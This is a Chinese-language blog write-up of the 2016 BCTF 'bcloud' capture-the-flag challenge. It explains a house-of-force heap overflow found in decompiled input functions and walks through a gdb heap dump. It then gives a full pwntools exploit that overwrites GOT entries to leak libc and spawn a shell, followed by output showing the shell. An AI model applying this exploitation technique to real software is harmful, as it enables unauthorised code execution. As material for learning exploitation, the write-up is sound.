---
title: 2016 BCTF bcloud
date: 2017-03-18 13:38:12
tags:
- house-of-force
- ctf
categories:
- ctf_practice
---

## Challenge
好吧，这题不是很难，但是前面没怎么发现该怎么利用。原因是我做题就直奔中心部分，前面的初始化函数往往没怎么认真看。
漏洞函数为sub_804884E()，可以造成house of force。我前面刚好记录了[house of force](http://w0lfzhang.me/2016/10/15/house-of-force/)的利用过程，思路都差不多，就当是巩固练习吧。
其实漏洞都是由下面这个函数造成的：
<!-- more -->
```c
int __cdecl input(int a1, int a2, char a3)
{
  char buf; // [sp+1Bh] [bp-Dh]@2
  int i; // [sp+1Ch] [bp-Ch]@1

  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1u) <= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;
  return i;
}
```
在input name的函数中能泄露heap的地址。然后下面的函数又给house of force“埋下了伏笔”。。。
```c
int sub_804884E()
{
  char org; // [sp+1Ch] [bp-9Ch]@1
  char *org_p; // [sp+5Ch] [bp-5Ch]@1
  int host; // [sp+60h] [bp-58h]@1
  char *host_p; // [sp+A4h] [bp-14h]@1
  int v5; // [sp+ACh] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  memset(&org, 0, 0x90u);
  puts("Org:");
  input((int)&org, 64, 10);
  puts("Host:");
  input((int)&host, 64, 10);
  host_p = (char *)malloc(0x40u);
  org_p = (char *)malloc(0x40u);
  ::org = (int)org_p;   /*op 1*/
  ::host = (int)host_p;
  strcpy(host_p, (const char *)&host);
  strcpy(org_p, &org);
  puts("OKay! Enjoy:)");
  return *MK_FP(__GS__, 20) ^ v5;
}


```
前面四个变量的位置如果不仔细看的话，后面看主体部分的时候真看不出有什么漏洞了。
由于缓冲区和两个指针都是相邻的，而后面的赋值操作op 1把缓冲区后面的\x00给覆盖了，所以strcpy(org_p, &org)会顺带把org_p和host缓冲区也给拷贝到堆上了。调试时发现正好可以覆盖到top chunk的size字段。
```shell
gdb-peda$ x/72wx 0x084d9000
0x84d9000:	0x00000000	0x00000049	0x61616161	0x61616161
0x84d9010:	0x61616161	0x61616161	0x61616161	0x61616161
0x84d9020:	0x61616161	0x61616161	0x61616161	0x61616161
0x84d9030:	0x61616161	0x61616161	0x61616161	0x61616161
0x84d9040:	0x61616161	0x61616161	0x084d9008	0x00000049
0x84d9050:	0xffffffff	0x00000000	0x00000000	0x00000000
0x84d9060:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d9070:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d9080:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d9090:	0x00000000	0x00000049	0x6f6f6f6f	0x6f6f6f6f
0x84d90a0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
0x84d90b0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
0x84d90c0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
0x84d90d0:	0x6f6f6f6f	0x6f6f6f6f	0x084d9098	0xffffffff <---
0x84d90e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d90f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d9100:	0x00000000	0x00000000	0x00000000	0x00000000
0x84d9110:	0x00000000	0x00000000	0x00000000	0x00000000
```
top chunk的地址为0x84d90d8，可以看到它的size字段已经被覆盖为0xffffffff。而主程序中有malloc(n+4)，这样我们很容易进行house of force攻击。

## Exploit
```python
from pwn import *

debug = 1
if debug:
  #context.log_level = "DEBUG"
  p = process('./bcloud')
else:
  p = remote()

def new(len, data):
  p.recvuntil(">>\n")
  p.sendline('1')
  p.recvuntil("Input the length of the note content:\n")
  r = str(len)
  p.sendline(r)
  p.recvuntil("Input the content:\n")
  p.send(data)

def edit(index, data):
  p.recvuntil(">>\n")
  p.sendline('3')
  p.recvuntil("Input the id:\n")
  p.sendline(str(index))
  p.recvuntil("Input the new content:\n")
  p.send(data)

def delete(index):
  p.recvuntil(">>\n")
  p.sendline('4')
  p.recvuntil("Input the id:\n")
  p.sendline(str(index))
  
p.recvuntil("Input your name:\n")
p.send('a'*64)
r = p.recvline()
heap_addr = u32(r[68:72])
base_heap = heap_addr - 0x8
heap_top = base_heap + 0xD8 #216
print "base_heap: " + hex(base_heap)

p.recvuntil("Org:\n")
p.send('o'*64)
p.recvuntil("Host:\n")
p.sendline("\xff\xff\xff\xff")
#raw_input("init?go")

bss_len_addr = 0x0804B0a0
free_got = 0x0804B014
printf_plt = 0x080484D0
atoi_got = 0x0804B03C
read_got = 0x0804B00C

n = bss_len_addr - 8 - heap_top - 8  #pre_size + size
print "size: " + hex(int(n))

new(n, "\n")
new(160, "/bin/sh\x00" + "\n")
#raw_input()
#edit(1, 'aaaaaaaa'+"\n")
#raw_input("go")

payload = p32(4)   #id0's length
payload += p32(4)   #id1's length
payload += p32(4)   #id2's length
payload += 'a' * 0x74
payload += p32(free_got)   #id0's pointer    change it carefully!!
payload += p32(read_got)   #id1's pointer
payload += p32(atoi_got)   #id2's pointer

edit(1, payload + "\n")
edit( 0, p32(printf_plt) )  #free-got-->printf_plt

delete(1)  #free(id0's pointer)  -->printf(read_got)
read_addr = u32(p.recv(4))
print "read_addr: " + hex(read_addr)
#raw_input("g0")

libc_base = read_addr - 0xdaf60
print "libc_base: " + hex(libc_base)
system_addr = libc_base + 0x40310
print "system_addr: " + hex(system_addr)

edit(2, p32(system_addr))

p.recvuntil(">>\n")
p.sendline('/bin/sh\x00')

p.interactive()

```
因为house of force攻击可以控制任何内存区域(用户态可写部分)，所以关键就是控制哪了。开始会想着直接来控制got表，但是一个问题是libc的泄露。show函数没有输出内容，只是输出一句简单的话。所以直接写got表示没用的。
我们可以控制bss段的两个数组内存区域，一个为存储长度的数组，另一个为存储堆指针的数组。然后我们结合edit和delete功能泄露libc的地址，并且来写got表。

我们可以先把id0的堆指针改为free_got的地址，然后edit，将free_got改为print_plt
的地址，并且再把其中的一个堆地址改为read_got。然后delete，就相当于printf(read_got)，这样就泄露了libc的地址。然后在以同样方式把atoi_got改为system的地址，这样再选择时输入/bin/sh就能得到shell了。

```shell
wolzhang@wolzhang666:~/Desktop$ python bcloud.py 
[+] Starting local process './bcloud': Done
base_heap: 0x8b43000
size: -0xaf8048
read_addr: 0xf763af60
libc_base: 0xf7560000
system_addr: 0xf75a0310
[*] Switching to interactive mode
$ id
uid=1000(wolzhang) gid=1000(wolzhang) groups=1000(wolzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```


